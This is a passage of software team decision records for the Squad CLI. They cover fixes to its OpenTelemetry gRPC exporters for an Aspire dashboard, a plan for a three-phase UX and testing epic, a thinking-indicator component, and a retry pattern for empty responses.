3. **VS Code launch configs get the env var** — `OTEL_EXPORTER_OTLP_ENDPOINT=http://localhost:4317` added to "Squad REPL" and "Squad REPL (rebuild first)" in `.vscode/launch.json`. Not added to npm scripts to avoid polluting all terminal sessions.

4. **Resilience hardened** — `_sdk.start()` in `otel.ts` wrapped in try/catch so gRPC connection failures are non-fatal. The SDK's gRPC exporters already silently retry on connection refused, but this guards against synchronous startup exceptions.

## Consequences

- When `OTEL_EXPORTER_OTLP_ENDPOINT` is set and Aspire is running, traces and metrics flow automatically.
- When the env var is unset or the endpoint is unreachable, everything remains a no-op — zero impact on normal REPL usage.
- F5 debugging in VS Code automatically targets the local Aspire dashboard.


# Decision: Switch OTel exporters from HTTP to gRPC

**Author:** Saul (Aspire & Observability)  
**Date:** 2026-02-XX  
**Status:** Implemented  

## Context

Brady reported that no telemetry appeared in the Aspire dashboard despite the container running and `OTEL_EXPORTER_OTLP_ENDPOINT` being set.

## Root Cause

Three compounding bugs:

1. **Protocol mismatch** — `otel.ts` used `@opentelemetry/exporter-trace-otlp-http` (OTLP/HTTP), but Aspire only accepts OTLP/gRPC on port 18889. HTTP exports to a gRPC port fail silently.
2. **Wrong endpoint constant** — `aspire.ts` set `OTEL_EXPORTER_OTLP_ENDPOINT` to `http://localhost:18888` (the dashboard UI), not `http://localhost:4317` (host-mapped OTLP gRPC port).
3. **OTLP auth mode = ApiKey** — Docker launched Aspire with `DASHBOARD__OTLP__AUTHMODE=ApiKey` but the SDK never sent an API key. Connections were rejected.

## Decision

- Switch SDK exporters to gRPC (`exporter-trace-otlp-grpc`, `exporter-metrics-otlp-grpc`). The gRPC packages were already in the dependency tree transitively via `@opentelemetry/sdk-node`.
- Fix the `ASPIRE_OTLP_ENDPOINT` constant to `http://localhost:4317`.
- Set OTLP auth mode to `Unsecured` for local dev Docker launches.
- Update docs with correct env vars and a Quick Debug Checklist.

## Impact

- All OTel telemetry (traces + metrics) will now reach the Aspire dashboard when `OTEL_EXPORTER_OTLP_ENDPOINT=http://localhost:4317` is set.
- No breaking change for SDK consumers who don't use OTel (everything remains opt-in/no-op).
- The gRPC dependency is already present; no new packages added to the tree.


# Decision: Personal Squad Tutorial Added to Guide Section

**Date:** 2026-02-23
**Author:** McManus (DevRel)
**Requested by:** Brady

## What

Created `docs/guide/personal-squad.md` — a flagship end-to-end tutorial on setting up and using a personal squad. Added to the Guide section in docs/build.js SECTION_ORDER.

## Why

Brady's directive: write the tutorial on personal squads. This is the first user-facing documentation for `squad init --global` and the remote mode resolution system. The feature existed in code (resolution.ts, cli-entry.ts) but had no dedicated tutorial.

## Decisions Made

1. **Tone:** Matched existing docs exactly (first-session.md as gold standard). No hype. "It's still very new" energy throughout.
2. **Behind the scenes depth:** Explained the config.json teamRoot pointer, local vs. remote mode split, and resolution algorithm — enough to understand what's happening, not enough to be a reference doc.
3. **Use cases:** Five practical scenarios (side projects, cross-repo review, new codebases, growing skills, workflow automation) — all plausible today, no future-state fiction.
4. **Honesty section:** Explicitly called out limitations (no sync between machines, project keys unused, no conflict handling, no UI).
5. **Nav placement:** Third in Guide section after tips-and-tricks and sample-prompts.

## Impact

- New page in published docs site (guide/personal-squad.html)
- Guide nav updated with new entry
- No breaking changes to existing pages




### 2026-02-23: E2E Test Harness Design
**By:** Breedan
**Summary:** Implemented child_process-based terminal harness for CLI acceptance testing instead of node-pty, providing cross-platform compatibility and CI-friendly execution without native compilation.
**Details:** See orchestration log for full context.

### 2026-02-23: REPL UX Test Suite Patterns
**By:** Hockney
**Summary:** Created 40-test suite using ink-testing-library to validate visual REPL behavior across 6 categories (thinking indicator, agent panel, message stream, input prompt, welcome, never-dead requirement).
**Details:** See orchestration log for full context.

### 2026-02-24: REPL UX Overhaul
**By:** Kovash
**Summary:** Implemented visual improvements including elapsed-time tracking, pulsing agent indicators, response timestamps, and animated spinners to ensure the interface never appears dead during processing.
**Details:** See orchestration log for full context.

### 2026-02-23: Initial CLI UX Audit
**By:** Marquez
**Summary:** Comprehensive audit of Squad CLI identified 21 issues ranging from P0 blockers (80-char violations, unclear errors) to P2 polish opportunities, with 6 UX gates defined for quality enforcement.
**Details:** See orchestration log for full context.

### 2026-02-23: SQUAD_DEBUG auto-enables OTel diagnostics
**By:** Saul
**Summary:** OTel SDK now auto-enables DiagConsoleLogger at WARN level when SQUAD_DEBUG=1 is set, surfacing gRPC transport errors that were previously invisible to operators.
**Details:** See orchestration log for full context.
# Decision: Testing Epic PRD Structure

**Author:** Keaton (Lead)  
**Date:** 2026-02-24  
**Status:** Awaiting Brady Approval  

## Context

Brady's CLI died after 2 minutes due to hard-coded timeout in `packages/squad-cli/src/cli/shell/index.ts:123`. He wants the CLI to be "take-your-breath-away-good" with engaging feedback during long waits, Claude-style thinking words, Copilot-style action display, and never feel dead.

New agents joined: Cheritto (TUI), Breedan (E2E tests), Waingro (hostile QA), Nate (accessibility), Marquez (UX design). Marquez delivered 21-item UX audit, Breedan designed E2E harness, Kovash shipped REPL UX overhaul, Hockney has 40 REPL UX tests.

## Decision

Created 3-phase epic PRD with 21 numbered items:

### Phase 1: Testing Wave (6 items)
- Fix 2-minute timeout → configurable via env var, 10-minute default
- Dogfood CLI with 4 repo types (fresh init, existing squad, monorepo, solo)
- Expand E2E test coverage (10+ new Gherkin scenarios)
- Hostile QA (Waingro breaks it in 7+ conditions: tiny terminals, no config, rapid Ctrl+C, etc.)
- Accessibility audit (Nate reviews keyboard nav, color contrast, error guidance)
- Fix P0 UX blockers from Marquez (5 items: help text overflow, version format, error remediation, empty states, init flags)

### Phase 2: Improvement Phase (5 items)
- Implement P1 UX polish from Marquez (8 items: verb consistency, focus indicator, keyboard hints, etc.)
- Engaging thinking feedback (Claude-style phrases + Copilot-style action display)
- Ghost response detection + retry logic (3 attempts, user feedback)
- Fix all P0 bugs from Phase 1 testing
- Harden error handling (actionable messages, remediation hints, no stack traces to users)

### Phase 3: Make It Breathtaking (7 items)
- Rich progress indicators (which agent, what they're doing, pulsing dots, elapsed time)
- Terminal adaptivity (beautiful at 120-col, functional at 80-col, graceful at 40-col)
- Animations & transitions (spinners, pulsing dots, color transitions, smooth status changes)
- Copy polish (human, fun, action-oriented — not stuffy)
- Accessibility hardening (keyboard-first, NO_COLOR mode, focus indicators, guidelines doc)
- P2 nice-to-haves from Marquez (6 items: remove "you:" prefix, separator consistency, etc.)
- The "wow moment" — first `squad init` feels magical

## Key Architectural Decisions

### Timeout Configuration
- Environment variable: `SQUAD_SESSION_TIMEOUT_MS`
- Default: 600_000ms (10 minutes, not 2 minutes)
- Keep-alive feedback: elapsed time updates every second, ThinkingIndicator color cycles (cyan < 3s, yellow 3–8s, magenta > 8s)
- Test validation: 15-minute conversation must complete without timeout

### Thinking Feedback Design
- **Claude-style:** Rotate through 5–7 thinking phrases every 2–3 seconds ("Analyzing...", "Considering...", "Synthesizing...")
- **Copilot-style:** Stream agent actions in real time ("Reading file src/index.ts...", "Spawning specialist...", "Analyzing dependencies...")
- Must work during 10+ minute conversations (blocks on timeout fix in Phase 1)

### Terminal Adaptivity Approach
- **120-col:** Full layout with separators, full help text
- **80-col:** Standard layout (current target, existing implementation)
- **40-col:** Compact layout (single-column, abbreviated labels)
- Separators must respect terminal width: `Math.min(terminal.columns, 80)`
- E2E tests must pass at all three widths

### Copy Guidelines
- Human, fun, action-oriented (not stuffy)
- Active voice, imperative verbs
- Every error includes remediation hint
- Example transformation:
  - Before: "No squad directory found in repository tree or global path"
  - After: "No team found. Run 'squad init' to create one."

## Agent Assignment Strategy

**Cheritto (TUI)** owns the most work (9 items across all phases):
- Phase 1: 1.1 (timeout), 1.6 (P0 UX)
- Phase 2: 2.1 (P1 UX), 2.2 (thinking), 2.3 (ghost), 2.5 (errors)
- Phase 3: 3.1 (progress), 3.2 (adaptivity), 3.3 (animations), 3.6 (P2 UX), 3.7 (wow)

**Testing specialists:**
- Breedan: 1.3 (E2E expansion)
- Waingro: 1.2 (dogfood), 1.4 (hostile QA)
- Hockney: 2.5 (error tests)

**UX specialists:**
- Marquez: 1.6, 2.1, 3.1, 3.4, 3.6, 3.7 (review/design)
- Nate: 1.5 (audit), 3.2 (review), 3.5 (hardening)
- Kovash: 2.2 (review), 3.3 (review)

**Tone review:**
- McManus: 3.4 (copy polish tone review)

## Dependencies Mapped

### Phase 1 → Phase 2
- 1.6 (P0 UX) → 2.1 (P1 UX) — blockers before polish
- 1.1 (timeout) → 2.2 (thinking) — working timeout before long-wait feedback
- 1.2, 1.4 (bug catalog) → 2.4 (fix P0 bugs) — bugs found before fixing

### Phase 2 → Phase 3
- 2.1 (P1 UX) → 3.2 (adaptivity) — foundation before adaptivity
- 2.1 (P1 UX) → 3.6 (P2 UX) — P1 before P2
- 2.2 (thinking) → 3.1 (progress) — thinking feedback is foundation for rich progress

### Within Phase 3
- 3.3 (animations) → 3.7 (wow moment) — animations needed for magical init

## Success Gates

**Phase 1:** Timeout fixed, CLI tested (4 repos), E2E expanded (10+ scenarios), hostile QA (7+ conditions), accessibility audit, P0 UX fixed, bugs cataloged

**Phase 2:** P1 UX fixed, thinking feedback engaging (Brady approves), ghost handling, P0 bugs fixed, errors actionable

**Phase 3:** Rich progress, terminal adaptivity (40–120 cols), animations smooth, copy polished, accessibility hardened, P2 UX, **Brady says "breathtaking"**

## Next Steps

1. Brady reviews PRD (session state file: `prd-testing-epic.md`)
2. Create GitHub epic issue (copy PRD as issue body)
3. Create 21 sub-issues (one per item, numbered 1.1–3.7)
4. Assign agents per assignment table
5. Schedule Phase 1 kickoff (all agents read PRD, ask questions)
6. Execute Phase 1
7. Phase 1 retrospective, adjust Phase 2 scope if needed
8. Repeat for Phases 2 & 3

## Why This Structure

**3 phases, not 1 monolith:** Each phase has distinct objective (test, fix, polish). Allows for retrospectives and scope adjustments between phases.

**21 numbered items, not open-ended:** Clear scope, clear ownership, clear dependencies. Each item can become a GitHub sub-issue with its own acceptance criteria.

**Agent assignments upfront:** Cheritto is load-balanced (9 items but spread across all phases). Specialists are focused (Breedan E2E, Waingro QA, Nate accessibility). Avoids "who's doing what?" confusion.

**Dependencies explicit:** No item starts before its dependencies are done. Prevents rework (e.g., P0 UX must be fixed before P1 UX, timeout must work before testing long-wait feedback).

**Success gates concrete:** Not "improve UX" but "all P0 items fixed + Marquez approves + UX gates pass". Not "make it better" but "Brady says breathtaking".

## Pattern for Future Epics

When writing multi-phase epics:
1. Number all items (phase.item format: 1.1, 1.2, 2.1, etc.)
2. Assign agents upfront (with item counts to balance load)
3. Map dependencies explicitly (which items block which)
4. Define success criteria per phase (concrete, testable, or approval-gated)
5. Include risks & mitigations section
6. Provide next steps (how to execute, not just what to build)



### 2026-02-23T19:27Z: Telemetry in both CLI and agent modes
**By:** Brady (via Copilot)
**What:** Squad should pump telemetry during BOTH modes of usage: (1) when running as the standalone Squad CLI, and (2) when running as an agent inside GitHub Copilot CLI. Brady wants to see telemetry from both surfaces.
**Why:** User request — captured for team memory. Affects OTel integration architecture.

# Decision: ThinkingIndicator two-layer architecture

**Date:** 2026-02-24
**By:** Cheritto (TUI Engineer)
**Issue:** #331 — Engaging thinking feedback
**PR:** #351

## Decision

Extracted the inline ThinkingIndicator from MessageStream.tsx into a standalone `ThinkingIndicator.tsx` component with a two-layer design:

1. **Layer 1 (Claude-style):** 10 rotating thinking phrases cycled every 2.5s — "Analyzing...", "Considering...", etc.
2. **Layer 2 (Copilot-style):** Activity hints from SDK `tool_call` events — "Reading file...", "Spawning specialist...", etc. Takes priority over Layer 1 when available.

## Why

- Standalone component is reusable (AgentPanel could use it too if needed)
- Two-layer priority system means we always show *something* engaging (Layer 1) but upgrade to specific info when we have it (Layer 2)
- `setActivityHint` on ShellApi lets the streaming pipeline push hints without coupling to React internals

## Team impact

- **Marquez:** May want to adjust phrase list or rotation timing — both are exported constants
- **Kovash:** MessageStream interface now has optional `activityHint` prop
- **Breedan:** 16 new tests in `test/repl-ux.test.ts` sections 7 + 8
- **Foundation for 3.1 (rich progress):** ThinkingIndicator can be extended with progress bars, sub-task tracking

# Decision: P0 Bug Fixes from Phase 1 Testing

**By:** Hockney (Tester)
**Date:** 2026-02-23
**Issue:** #333
**PR:** #351

## Decisions Made

### BUG-2: Empty/whitespace args behavior
**Decision:** Empty string and whitespace-only CLI args show brief help text and exit 0.
**Rationale:** Previously, `squad ""` launched the interactive shell in non-TTY mode (exit 1), and `squad "   "` hit the "Unknown command" error. Neither is useful. Showing help is the least-surprise behavior and matches how most CLI tools handle garbage input.
**Implementation:** Trim `args[0]` early; if raw arg was provided but trims to empty, show help instead of routing to shell or command dispatch.

### BUG-1: --version bare semver is correct
**Decision:** No code change needed. Bare semver from `--version` is intentional per Cheritto's P0 UX fix (PR #349) and Marquez's audit.
**Action:** Updated `version.feature` acceptance test which still asserted `output contains "squad"` — this conflicted with the `ux-gates.test.ts` gate that explicitly verifies no "squad" prefix.

### version.feature was stale
**Observation:** Acceptance tests can drift from UX decisions when multiple PRs change the same behavior. The version.feature file was written before the P0 UX decision to use bare semver, and nobody caught the conflict because the acceptance tests run separately from UX gate tests.
**Recommendation:** Run both acceptance AND ux-gates tests in CI as a single quality gate to catch drift.

## For Team Awareness
- 3 pre-existing test failures in `repl-ux.test.ts` (AgentPanel empty-state rendering). Not introduced by this PR — Kovash's component changes made the old assertions stale. Someone should update those tests.

# Decision: Dual-mode OTel telemetry (Issue #343)

**By:** Saul
**Date:** 2026-02-24
**PR:** #352

## What
Added `squad.mode` resource attribute to OTel initialization and created `initAgentModeTelemetry()` convenience function for the Copilot agent-mode entry point.

## Why
Brady wants telemetry from both CLI and Copilot agent surfaces. The two modes need distinct `serviceName` and `squad.mode` attributes so they're distinguishable in Aspire dashboards and trace queries.

## How
- `OTelConfig.mode` → written as `squad.mode` resource attribute in `buildResource()`
- `initAgentModeTelemetry()` in `otel-init.ts` → pre-configures `serviceName: 'squad-copilot-agent'`, `mode: 'copilot-agent'`
- `runShell()` now passes `mode: 'cli'` to tag CLI telemetry
- Exported from SDK barrel so consumers can `import { initAgentModeTelemetry } from '@bradygaster/squad-sdk'`

## Team impact
- **Any agent building the Copilot agent-mode entry point:** Call `initAgentModeTelemetry()` at startup and `handle.shutdown()` on exit. That's it.
- **Existing CLI telemetry:** Now tagged with `squad.mode = 'cli'` — no breaking change.
- **Dashboard queries:** Filter by `squad.mode` or `service.name` to isolate surfaces.


# Decision: ThinkingIndicator two-layer architecture

**Date:** 2026-02-24
**By:** Cheritto (TUI Engineer)
**Issue:** #331 — Engaging thinking feedback
**PR:** #351

## Decision

Extracted the inline ThinkingIndicator from MessageStream.tsx into a standalone `ThinkingIndicator.tsx` component with a two-layer design:

1. **Layer 1 (Claude-style):** 10 rotating thinking phrases cycled every 2.5s — "Analyzing...", "Considering...", etc.
2. **Layer 2 (Copilot-style):** Activity hints from SDK `tool_call` events — "Reading file...", "Spawning specialist...", etc. Takes priority over Layer 1 when available.

## Why

- Standalone component is reusable (AgentPanel could use it too if needed)
- Two-layer priority system means we always show *something* engaging (Layer 1) but upgrade to specific info when we have it (Layer 2)
- `setActivityHint` on ShellApi lets the streaming pipeline push hints without coupling to React internals

## Team impact

- **Marquez:** May want to adjust phrase list or rotation timing — both are exported constants
- **Kovash:** MessageStream interface now has optional `activityHint` prop
- **Breedan:** 16 new tests in `test/repl-ux.test.ts` sections 7 + 8
- **Foundation for 3.1 (rich progress):** ThinkingIndicator can be extended with progress bars, sub-task tracking

# Decision: Ghost response retry pattern

**By:** Cheritto (TUI Engineer)
**Date:** 2026-02-25
**PR:** squad/332-ghost-response
**Closes:** #332

## What

Ghost responses (empty `sendAndWait()` results) are now detected and retried automatically with exponential backoff.

## Design

- `withGhostRetry(sendFn, options)` is a pure, exported function — no closure dependencies on shell state.
- The shell-bound `ghostRetry()` wrapper inside `runShell()` wires UI feedback (retry/exhaustion messages) via callbacks.
- Both `dispatchToAgent()` and `dispatchToCoordinator()` use the same retry path.
- On each retry, `accumulated` is reset before re-calling `awaitStreamedResponse()` so the delta handler re-accumulates from the new response.

## Why

The SDK occasionally fires `session.idle` before `assistant.message`, causing `sendAndWait()` to resolve with `undefined`. Without retry, the user sees nothing — a silent failure. Exponential backoff (1s, 2s, 4s) avoids hammering the backend while giving the LLM time to recover.

## Team impact

- If anyone adds new dispatch paths, they should use `ghostRetry()` (inside `runShell()`) or `withGhostRetry()` (standalone) to handle empty responses.
- The `GhostRetryOptions` interface is exported for testing and extensibility.


### 2026-02-25: P1 UX polish — visual language standardization
**By:** Cheritto (TUI Engineer)
**PR:** #356 (branch `squad/330-p1-ux-polish`)
**What:** Standardized 8 visual/interaction patterns across the shell:
- System prefix is now `▸` (small triangle) — team should use this for all system-level messages
- Separators are terminal-width-aware via `process.stdout.columns` (capped at 120) — no more hardcoded widths
- Prompt stays cyan in all states (active + disabled) — yellow is reserved for warnings/processing indicators only
- Focus indicator uses text label `▶ Active` alongside pulsing dot — accessibility over decoration
- @-addressing is reinforced in placeholder text — key interaction model should be visible at all times
**Why:** Marquez audit identified 8 P1 inconsistencies. Standardizing now prevents divergence as we add features.
**Impact:** Any new components rendering separators or system messages should follow these patterns.
